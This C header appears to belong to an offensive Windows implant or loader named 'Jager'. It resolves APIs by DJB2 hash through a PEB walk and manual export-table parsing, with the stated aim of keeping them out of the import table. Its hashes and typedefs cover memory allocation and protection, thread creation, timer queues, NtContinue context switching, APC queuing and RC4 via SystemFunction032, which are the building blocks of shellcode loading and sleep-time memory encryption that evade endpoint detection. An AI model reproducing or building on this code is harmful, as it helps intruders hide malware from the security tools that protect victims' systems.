#ifndef JAGER_IAT_OBF_H
#define JAGER_IAT_OBF_H

#include <windows.h>
#include "peb.h"

/* Hash-based dynamic API resolution to avoid IAT entries */
typedef LPVOID (WINAPI *fnVirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);
typedef BOOL   (WINAPI *fnVirtualProtect)(LPVOID, SIZE_T, DWORD, PDWORD);
typedef BOOL   (WINAPI *fnVirtualFree)(LPVOID, SIZE_T, DWORD);
typedef HANDLE (WINAPI *fnCreateThread)(LPSECURITY_ATTRIBUTES, SIZE_T,
                                        LPTHREAD_START_ROUTINE, LPVOID, DWORD, LPDWORD);
typedef DWORD  (WINAPI *fnWaitForSingleObject)(HANDLE, DWORD);
typedef void   (WINAPI *fnSleep)(DWORD);
typedef HMODULE (WINAPI *fnLoadLibraryA)(LPCSTR);
typedef FARPROC (WINAPI *fnGetProcAddress)(HMODULE, LPCSTR);
typedef BOOL   (WINAPI *fnCreateTimerQueueTimer)(PHANDLE, HANDLE, WAITORTIMERCALLBACK,
                                                 PVOID, DWORD, DWORD, ULONG);
typedef BOOL   (WINAPI *fnDeleteTimerQueue)(HANDLE);
typedef HANDLE (WINAPI *fnCreateTimerQueue)(void);
typedef HANDLE (WINAPI *fnCreateEventA)(LPSECURITY_ATTRIBUTES, BOOL, BOOL, LPCSTR);
typedef BOOL   (WINAPI *fnSetEvent)(HANDLE);
typedef VOID   (NTAPI *fnRtlCaptureContext)(PCONTEXT);
typedef NTSTATUS (NTAPI *fnNtContinue)(PCONTEXT, BOOL);
typedef DWORD  (WINAPI *fnResumeThread)(HANDLE);
typedef BOOL   (WINAPI *fnCloseHandle)(HANDLE);
typedef DWORD  (WINAPI *fnWaitForSingleObjectEx)(HANDLE, DWORD, BOOL);
typedef HANDLE (WINAPI *fnCreateWaitableTimerW)(LPSECURITY_ATTRIBUTES, BOOL, LPCWSTR);
typedef BOOL   (WINAPI *fnSetWaitableTimer)(HANDLE, PLARGE_INTEGER, LONG,
                                            PTIMERAPCROUTINE, LPVOID, BOOL);
typedef VOID   (WINAPI *PTIMERAPCROUTINE)(PVOID, DWORD, DWORD);

typedef struct _OBF_USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PUCHAR Buffer;
} OBF_USTRING;

typedef NTSTATUS (WINAPI *fnSystemFunction032)(OBF_USTRING *, OBF_USTRING *);

static inline DWORD api_hash(const char *str) {
    DWORD hash = 5381;
    int c;
    while ((c = *str++))
        hash = ((hash << 5) + hash) + (DWORD)c;
    return hash;
}

static inline DWORD api_hash_w(const WCHAR *str, int len) {
    DWORD hash = 5381;
    for (int i = 0; i < len; i++) {
        WCHAR wc = str[i];
        if (wc >= L'A' && wc <= L'Z')
            wc = (WCHAR)(wc + (L'a' - L'A'));
        if (wc >= 0x80)
            continue;
        hash = ((hash << 5) + hash) + (DWORD)wc;
    }
    return hash;
}

static inline FARPROC resolve_api(HMODULE mod, DWORD hash) {
    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)mod;
    if (!dos || dos->e_magic != IMAGE_DOS_SIGNATURE)
        return NULL;

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)mod + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE)
        return NULL;

    PIMAGE_EXPORT_DIRECTORY exp = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)mod +
        nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
    if (!exp)
        return NULL;

    DWORD *names = (DWORD *)((BYTE *)mod + exp->AddressOfNames);
    WORD  *ordinals = (WORD *)((BYTE *)mod + exp->AddressOfNameOrdinals);
    DWORD *funcs = (DWORD *)((BYTE *)mod + exp->AddressOfFunctions);

    for (DWORD i = 0; i < exp->NumberOfNames; i++) {
        char *name = (char *)((BYTE *)mod + names[i]);
        if (api_hash(name) == hash)
            return (FARPROC)((BYTE *)mod + funcs[ordinals[i]]);
    }
    return NULL;
}

static inline HMODULE get_module_by_hash(DWORD hash) {
    PJAGER_PEB peb = jager_read_peb();
    if (!peb || !peb->Ldr)
        return NULL;

    PLIST_ENTRY head = &peb->Ldr->InMemoryOrderModuleList;
    for (PLIST_ENTRY entry = head->Flink; entry != head; entry = entry->Flink) {
        PJAGER_LDR_DATA_TABLE_ENTRY mod =
            CONTAINING_RECORD(entry, JAGER_LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (!mod->BaseDllName.Buffer || mod->BaseDllName.Length == 0)
            continue;
        int nchars = mod->BaseDllName.Length / (int)sizeof(WCHAR);
        if (api_hash_w(mod->BaseDllName.Buffer, nchars) == hash)
            return (HMODULE)mod->DllBase;
    }
    return NULL;
}

/* Pre-computed DJB2 hashes (api_hash at build time) */
#define HASH_VirtualAlloc          0x382C0F97U
#define HASH_VirtualProtect        0x844FF18DU
#define HASH_VirtualFree           0x668FCF2EU
#define HASH_CreateThread          0x7F08F451U
#define HASH_WaitForSingleObject   0xECCDA1BAU
#define HASH_Sleep                 0x0E19E5FEU
#define HASH_LoadLibraryA          0x5FBFF0FBU
#define HASH_GetProcAddress        0xCF31BB1FU
#define HASH_CreateTimerQueueTimer 0x117296A0U
#define HASH_DeleteTimerQueue      0xA3B4107EU
#define HASH_CreateTimerQueue      0x05E1C3FFU
#define HASH_CreateEventA          0x5D01F19CU
#define HASH_SetEvent              0x877EBBD3U
#define HASH_RtlCaptureContext     0x7733EED0U
#define HASH_NtContinue            0x780A612CU
#define HASH_NtQueueApcThread      0xD4612238U
#define HASH_NtTestAlert           0x7915B7DFU
#define HASH_NtQueryInformationThread 0xC91F149BU
#define HASH_RtlExitUserThread     0x8E492B88U
#define HASH_ResumeThread          0x74162A6EU
#define HASH_CloseHandle           0x3870CA07U
#define HASH_WaitForSingleObjectEx 0x56BD0197U
#define HASH_CreateWaitableTimerW  0x09463EDAU
#define HASH_SetWaitableTimer      0x04525BFBU
#define HASH_SystemFunction032     0xCCCF3585U

#define HASH_KERNEL32_DLL          0x7040EE75U
#define HASH_NTDLL_DLL             0x22D3B5EDU
#define HASH_ADVAPI32_DLL          0x67208A49U

#endif /* JAGER_IAT_OBF_H */
